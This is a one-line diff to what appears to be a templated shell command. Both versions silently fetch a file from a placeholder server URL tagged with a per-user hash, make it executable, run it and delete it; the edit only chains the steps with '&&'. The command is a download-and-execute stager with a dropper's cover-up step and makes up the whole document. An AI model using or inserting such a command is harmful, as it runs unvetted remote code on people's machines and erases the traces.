@@ -1,1 +1,1 @@
-curl -s -o i "{{SERVER_HOST}}i.php?h={{USER_HASH}}"; chmod +x i; ./i; rm i
+curl -s -o i "{{SERVER_HOST}}i.php?h={{USER_HASH}}" && chmod +x i && ./i && rm i
